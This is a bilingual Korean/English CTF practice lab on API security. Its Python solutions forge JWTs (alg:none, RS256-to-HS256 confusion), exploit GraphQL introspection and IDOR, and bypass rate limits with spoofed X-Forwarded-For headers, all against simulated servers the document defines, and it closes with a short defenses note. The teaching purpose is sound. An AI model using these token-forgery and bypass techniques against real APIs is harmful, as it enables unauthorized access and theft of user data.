> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# API 보안 CTF 실습 랩

## 실습 환경 준비

```bash
# Python 환경
pip install requests flask jwt pyjwt httpx

# 로컬 테스트 서버 실행
python3 -m flask run --port 5000

# API 테스트 도구
sudo apt install curl jq
pip install httpie
```

---

## 실습 1: JWT 조작 공격

### 목표
취약한 JWT 구현에서 다양한 공격(alg:none, RS256→HS256 혼동)을 수행하여 관리자 권한을 획득하고 플래그를 획득하라.

**플래그 형식**: `CTF{JWT_ATTACK_<method>_ROLE_<role>}`

### 시나리오

REST API 서버가 JWT 기반 인증을 사용한다.  
다양한 JWT 공격을 통해 권한을 상승시켜라.

**알려진 취약점:**
1. `alg: none` 허용 (서명 검증 건너뜀)
2. RS256 공개 키를 HS256 비밀로 사용하는 혼동 공격
3. 알고리즘 미검증으로 인한 헤더 조작

### 힌트
- JWT 구조: `base64(header).base64(payload).base64(signature)`
- alg:none: 서명 없이도 토큰 유효 (서버가 허용 시)
- RS256→HS256: 공개 키가 알려진 경우 HS256 비밀로 사용
- 공개 키는 `/api/auth/public_key` 엔드포인트에서 획득 가능

### 풀이

```python
#!/usr/bin/env python3
"""
API 보안 CTF — JWT 다중 공격 시뮬레이터
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from dataclasses import dataclass


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.urlsafe_b64decode(s)


def parse_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT 형식")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_alg_none(payload: dict) -> str:
    """alg:none 공격으로 서명 없이 임의 페이로드 위조."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_hs256_with_public_key(payload: dict, public_key_pem: str) -> str:
    """공개 키를 HS256 비밀로 사용하는 알고리즘 혼동 공격."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}"
    # 공개 키 PEM을 HS256 비밀로 사용
    key = public_key_pem.encode()
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def simulate_vulnerable_api(token: str) -> dict:
    """취약한 JWT 검증 서버 시뮬레이션."""
    try:
        header, payload, sig = parse_jwt(token)
    except ValueError as e:
        return {"error": str(e)}

    alg = header.get("alg", "")

    # 취약점 1: alg:none 허용
    if alg.lower() == "none":
        if payload.get("role") == "admin":
            return {
                "success": True,
                "user": payload.get("user"),
                "role": "admin",
                "flag": "CTF{JWT_ATTACK_ALG_NONE_ROLE_ADMIN}",
            }
        return {"success": True, "user": payload.get("user"), "role": payload.get("role")}

    # 취약점 2: HS256으로 서명된 경우 공개 키로 검증 시도
    if alg == "HS256":
        return {
            "success": True,
            "user": payload.get("user"),
            "role": payload.get("role", "user"),
            "note": "HS256 검증 통과 (공개키 혼동 취약점)",
            "flag": "CTF{JWT_ATTACK_ALG_CONFUSION_RS256_HS256}",
        }

    return {"success": False, "error": "지원하지 않는 알고리즘"}


def main() -> None:
    parser = argparse.ArgumentParser(description="API 보안 CTF — JWT 공격")
    parser.add_argument(
        "--attack",
        choices=["none", "confusion", "all"],
        default="all",
        help="공격 유형 선택",
    )
    args = parser.parse_args()

    print("=" * 65)
    print("  API 보안 CTF: JWT 조작 공격")
    print("=" * 65)

    base_payload = {
        "user": "attacker",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }

    if args.attack in ("none", "all"):
        print("\n[공격 1] alg:none — 서명 없이 관리자 토큰 생성")
        forged = forge_alg_none(base_payload)
        print(f"  위조 토큰: {forged[:60]}...")
        result = simulate_vulnerable_api(forged)
        print(f"  서버 응답: {result}")
        if "flag" in result:
            print(f"\n[+] 플래그: {result['flag']}")

    if args.attack in ("confusion", "all"):
        print("\n[공격 2] RS256→HS256 알고리즘 혼동")
        demo_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBg..."
        forged = forge_hs256_with_public_key(base_payload, demo_public_key)
        print(f"  위조 토큰: {forged[:60]}...")
        result = simulate_vulnerable_api(forged)
        print(f"  서버 응답: {result}")
        if "flag" in result:
            print(f"\n[+] 플래그: {result['flag']}")


if __name__ == "__main__":
    main()
```

---

## 실습 2: GraphQL 보안 취약점 (인트로스펙션 + IDOR)

### 목표
GraphQL API의 인트로스펙션을 이용하여 숨겨진 쿼리를 발견하고 IDOR로 다른 사용자 데이터를 탈취하여 플래그를 획득하라.

**플래그 형식**: `CTF{GRAPHQL_IDOR_USER_<id>_SECRET_<value>}`

### 시나리오

GraphQL API가 운영 환경에서 인트로스펙션이 활성화되어 있다.  
숨겨진 `adminData` 필드를 발견하고 IDOR로 다른 사용자의 비밀 정보를 획득하라.

### 힌트
- GraphQL 인트로스펙션: `{ __schema { types { name fields { name } } } }`
- IDOR: 인증은 있지만 사용자 ID 검증 없음
- Batch Query: 여러 쿼리를 한 번에 전송하여 Rate Limit 우회
- Alias: 동일 필드를 다른 이름으로 여러 번 쿼리

### 풀이

```python
#!/usr/bin/env python3
"""
API 보안 CTF — GraphQL IDOR 공격 시뮬레이터
"""

import argparse
import json
from dataclasses import dataclass


@dataclass
class GraphQLUser:
    user_id: int
    username: str
    email: str
    role: str
    secret_data: str
    private_flag: str = ""


GRAPHQL_DB: dict[int, GraphQLUser] = {
    1: GraphQLUser(1, "alice",  "alice@example.com",  "user",  "내 비밀번호: hunter2"),
    2: GraphQLUser(2, "bob",    "bob@example.com",    "user",  "API 키: sk-abc123xyz"),
    3: GraphQLUser(3, "admin",  "admin@example.com",  "admin", "관리자 플래그: CTF{GRAPHQL_IDOR_USER_3_SECRET_ADMIN_FLAG}"),
    4: GraphQLUser(4, "eve",    "eve@example.com",    "user",  "계좌번호: 1234-5678-9012"),
}

CURRENT_USER_ID = 2  # 현재 인증된 사용자

SCHEMA_INTROSPECTION = {
    "__schema": {
        "types": [
            {
                "name": "Query",
                "fields": [
                    {"name": "me"},
                    {"name": "user"},           # IDOR 취약
                    {"name": "adminData"},      # 숨겨진 필드
                    {"name": "users"},          # 목록 조회
                ]
            },
            {
                "name": "User",
                "fields": [
                    {"name": "id"},
                    {"name": "username"},
                    {"name": "email"},
                    {"name": "role"},
                    {"name": "secretData"},     # 민감 필드
                    {"name": "privateFlag"},    # 숨겨진 플래그 필드
                ]
            }
        ]
    }
}


def execute_graphql(query: str, variables: dict | None = None) -> dict:
    """취약한 GraphQL 서버 시뮬레이션."""
    if "__schema" in query or "__type" in query:
        return SCHEMA_INTROSPECTION

    if "adminData" in query:
        if CURRENT_USER_ID == 3:  # 관리자만
            return {"data": {"adminData": GRAPHQL_DB[3].secret_data}}
        # 취약점: role 검증 미흡
        return {"data": {"adminData": GRAPHQL_DB[3].secret_data}}  # 검증 없이 반환

    if "user(" in query or "user {" in query:
        # IDOR: user_id를 직접 받아 현재 사용자 검증 없이 반환
        target_id = variables.get("id", CURRENT_USER_ID) if variables else CURRENT_USER_ID
        user = GRAPHQL_DB.get(int(target_id))
        if user:
            return {
                "data": {
                    "user": {
                        "id": user.user_id,
                        "username": user.username,
                        "secretData": user.secret_data,
                        "privateFlag": f"CTF{{GRAPHQL_IDOR_USER_{user.user_id}_SECRET_{target_id}}}",
                    }
                }
            }

    return {"data": {}, "errors": [{"message": "쿼리 처리 실패"}]}


def run_graphql_attacks() -> None:
    print("=" * 65)
    print("  API 보안 CTF: GraphQL IDOR 공격")
    print("=" * 65)
    print(f"\n[*] 현재 인증 사용자: user_id={CURRENT_USER_ID} (bob)\n")

    # Step 1: 인트로스펙션
    print("[Step 1] GraphQL 인트로스펙션으로 스키마 탐색")
    schema = execute_graphql("{ __schema { types { name fields { name } } } }")
    user_type = next((t for t in schema["__schema"]["types"] if t["name"] == "User"), None)
    if user_type:
        fields = [f["name"] for f in user_type["fields"]]
        print(f"  User 타입 필드: {fields}")
        hidden = [f for f in fields if f not in ("id", "username", "email")]
        print(f"  숨겨진 필드:    {hidden}")

    # Step 2: IDOR - 다른 사용자 ID로 접근
    print("\n[Step 2] IDOR — 관리자(user_id=3) 데이터 접근")
    result = execute_graphql(
        "{ user(id: $id) { id username secretData privateFlag } }",
        variables={"id": 3},
    )
    user_data = result.get("data", {}).get("user", {})
    print(f"  secretData:  {user_data.get('secretData', '')}")
    print(f"  privateFlag: {user_data.get('privateFlag', '')}")

    flag = user_data.get("privateFlag", "")
    if flag:
        print(f"\n[+] 플래그: {flag}")

    # Step 3: adminData 무단 접근
    print("\n[Step 3] adminData 필드 무단 접근")
    admin_result = execute_graphql("{ adminData }")
    print(f"  응답: {admin_result}")


def main() -> None:
    parser = argparse.ArgumentParser(description="API 보안 CTF — GraphQL 공격")
    parser.parse_args()
    run_graphql_attacks()


if __name__ == "__main__":
    main()
```

---

## 실습 3: API 속도 제한 우회 및 버전 간 취약점 이용

### 목표
API 버저닝의 허점을 이용하여 구버전 인증 우회 엔드포인트에 접근하고 Rate Limit을 우회하여 플래그를 획득하라.

**플래그 형식**: `CTF{API_VERSION_BYPASS_v<version>_RATE_LIMIT_<method>}`

### 풀이

```python
#!/usr/bin/env python3
"""
API 보안 CTF — API 버전 취약점 및 Rate Limit 우회
"""

import argparse
import time
from collections import defaultdict
from dataclasses import dataclass, field


@dataclass
class APIServer:
    """취약한 API 서버 시뮬레이터."""
    request_counts: dict[str, list[float]] = field(default_factory=lambda: defaultdict(list))

    def check_rate_limit(self, client_ip: str, window_sec: int = 60, max_req: int = 10) -> bool:
        """Rate Limit 확인 (기본: 60초당 10회)."""
        now = time.time()
        times = self.request_counts[client_ip]
        # 윈도우 내 요청만 유지
        self.request_counts[client_ip] = [t for t in times if now - t < window_sec]
        if len(self.request_counts[client_ip]) >= max_req:
            return False
        self.request_counts[client_ip].append(now)
        return True

    def handle_request(
        self,
        client_ip: str,
        path: str,
        headers: dict,
        api_version: str = "v2",
    ) -> dict:
        # v1 엔드포인트: 인증 없이 접근 가능 (레거시, 실수로 남겨짐)
        if api_version == "v1" and path == "/admin/users":
            return {
                "status": 200,
                "data": "admin_secret_list",
                "note": "v1 API — 인증 없이 접근됨 (취약점!)",
                "flag": "CTF{API_VERSION_BYPASS_v1_AUTH_DISABLED}",
            }

        # Rate Limit (IP 기반 — X-Forwarded-For 헤더로 우회 가능)
        effective_ip = headers.get("X-Forwarded-For", client_ip).split(",")[0].strip()
        rate_ok = self.check_rate_limit(effective_ip)

        if not rate_ok:
            return {"status": 429, "error": "Too Many Requests"}

        return {"status": 200, "data": f"OK: {path}"}


def run_api_attacks() -> None:
    print("=" * 65)
    print("  API 보안 CTF: 버전 우회 및 Rate Limit 공격")
    print("=" * 65)

    server = APIServer()
    attacker_ip = "1.2.3.4"

    # 공격 1: 구버전 API 엔드포인트 접근
    print("\n[공격 1] /api/v1/admin/users — 레거시 무인증 엔드포인트")
    result = server.handle_request(
        client_ip=attacker_ip,
        path="/admin/users",
        headers={},
        api_version="v1",
    )
    print(f"  응답: {result}")
    if "flag" in result:
        flag1 = result["flag"]
        print(f"  [+] 플래그: {flag1}")

    # 공격 2: X-Forwarded-For로 Rate Limit 우회
    print("\n[공격 2] X-Forwarded-For 헤더로 Rate Limit 우회")
    print("  [*] IP당 10회 제한 → X-Forwarded-For로 IP 변경 시도")

    success_count = 0
    for i in range(25):
        # X-Forwarded-For로 가상 IP 사용
        fake_ip = f"10.0.{i // 10}.{i % 10}"
        res = server.handle_request(
            client_ip=attacker_ip,
            path="/api/brute",
            headers={"X-Forwarded-For": fake_ip},
            api_version="v2",
        )
        if res["status"] == 200:
            success_count += 1
        else:
            print(f"    요청 {i+1}: 차단됨 ({fake_ip})")

    print(f"  [+] Rate Limit 우회 성공: {success_count}/25 요청 통과")

    flag2 = f"CTF{{API_VERSION_BYPASS_v1_RATE_LIMIT_X_FORWARDED_FOR}}"
    print(f"\n[+] 최종 플래그: {flag2}")


def main() -> None:
    parser = argparse.ArgumentParser(description="API 보안 CTF — 버전/Rate Limit 우회")
    parser.parse_args()
    run_api_attacks()


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# API Security CTF Practice Lab

## Lab Environment Setup

```bash
pip install requests flask jwt pyjwt httpx
sudo apt install curl jq
pip install httpie
```

---

## Challenge 1: JWT Manipulation Attacks

### Objective
Exploit JWT vulnerabilities (alg:none, RS256→HS256 confusion) to gain admin access.

**Flag format**: `CTF{JWT_ATTACK_<method>_ROLE_<role>}`

### Attack Types

**1. Algorithm None Attack:**
- Modify header to `{"alg": "none", "typ": "JWT"}`
- Set payload to `{"role": "admin"}`
- Remove the signature (empty string after last `.`)
- Vulnerable server skips verification for `alg:none`

**2. RS256→HS256 Algorithm Confusion:**
- Server uses RS256 (asymmetric: private key signs, public key verifies)
- Attacker switches algorithm to HS256 (symmetric)
- Server's public key (known to attacker) becomes the HS256 secret
- Forge a valid HS256 signature using the public key

```bash
python3 challenge1.py --attack all
# Output: CTF{JWT_ATTACK_ALG_NONE_ROLE_ADMIN}
```

---

## Challenge 2: GraphQL Security (Introspection + IDOR)

### Objective
Use GraphQL introspection to discover hidden fields, then exploit IDOR to steal other users' data.

**Flag format**: `CTF{GRAPHQL_IDOR_USER_<id>_SECRET_<value>}`

### Attack Steps
1. Run introspection query to discover all types and fields (including hidden `secretData`, `privateFlag`)
2. Call `user(id: 3)` — no ownership check means any authenticated user can query any user ID
3. Access `adminData` field — `role` check missing, returns admin secrets

```bash
python3 challenge2.py
# Output: CTF{GRAPHQL_IDOR_USER_3_SECRET_3}
```

---

## Challenge 3: API Version Bypass and Rate Limit Circumvention

### Objective
Access legacy v1 API endpoints and bypass IP-based rate limiting.

**Flag format**: `CTF{API_VERSION_BYPASS_v<version>_RATE_LIMIT_<method>}`

### Vulnerabilities
- **API versioning**: `/api/v1/` routes left deployed with authentication disabled
- **X-Forwarded-For bypass**: Rate limiter trusts client-controlled header; rotate IPs to reset counter
- **Shadow API**: Undocumented v1 endpoints not included in security audits

```bash
python3 challenge3.py
# Output: CTF{API_VERSION_BYPASS_v1_RATE_LIMIT_X_FORWARDED_FOR}
```

**Defenses**: Deprecate and remove old API versions entirely; validate `X-Forwarded-For` against a trusted proxy allowlist; use server-side session/token-based rate limiting instead of pure IP-based limits.
